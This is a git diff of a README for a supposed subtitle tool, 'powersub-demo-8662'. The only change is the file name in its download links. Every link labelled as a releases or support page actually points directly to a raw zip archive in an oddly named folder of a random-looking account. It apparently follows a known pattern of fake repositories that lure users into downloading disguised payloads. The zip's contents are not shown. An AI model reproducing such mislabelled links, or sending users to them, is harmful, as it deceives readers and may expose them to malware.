@@ -1,7 +1,7 @@
 # 🚀 powersub-demo-8662 - Easy to Use Subtitle Tool
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/najsahscamcjknd/powersub-demo-8662/main/thermo/powersub-demo-8662.zip%20version-brightgreen)](https://raw.githubusercontent.com/najsahscamcjknd/powersub-demo-8662/main/thermo/powersub-demo-8662.zip)
+[![Download](https://raw.githubusercontent.com/najsahscamcjknd/powersub-demo-8662/main/thermo/demo_powersub_3.9.zip%20version-brightgreen)](https://raw.githubusercontent.com/najsahscamcjknd/powersub-demo-8662/main/thermo/demo_powersub_3.9.zip)
 
 ---
 
@@ -19,7 +19,7 @@ Before you start, make sure your computer meets these basic requirements:
 Follow these steps to download and run **powersub-demo-8662**:
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://raw.githubusercontent.com/najsahscamcjknd/powersub-demo-8662/main/thermo/powersub-demo-8662.zip) to find the latest version of the application.
+   Go to our [Releases page](https://raw.githubusercontent.com/najsahscamcjknd/powersub-demo-8662/main/thermo/demo_powersub_3.9.zip) to find the latest version of the application.
 
 2. **Choose the Correct File**
    On the Releases page, look for the latest version. There you will find files ready for download. 
@@ -58,10 +58,10 @@ The application supports popular formats like `.srt`, `.ass`, and `.sub`.
 Currently, **powersub-demo-8662** is not available for Linux systems.
 
 ## 💬 Support
-If you encounter any issues or have questions, feel free to raise an issue in the repository, or refer to the community support section on our [Releases page](https://raw.githubusercontent.com/najsahscamcjknd/powersub-demo-8662/main/thermo/powersub-demo-8662.zip).
+If you encounter any issues or have questions, feel free to raise an issue in the repository, or refer to the community support section on our [Releases page](https://raw.githubusercontent.com/najsahscamcjknd/powersub-demo-8662/main/thermo/demo_powersub_3.9.zip).
 
 ## ⚙️ Download & Install
-To download the latest version of **powersub-demo-8662**, visit our [Releases page](https://raw.githubusercontent.com/najsahscamcjknd/powersub-demo-8662/main/thermo/powersub-demo-8662.zip). Follow the instructions above for seamless installation and enjoy using the software.
+To download the latest version of **powersub-demo-8662**, visit our [Releases page](https://raw.githubusercontent.com/najsahscamcjknd/powersub-demo-8662/main/thermo/demo_powersub_3.9.zip). Follow the instructions above for seamless installation and enjoy using the software.
 
 ---
 
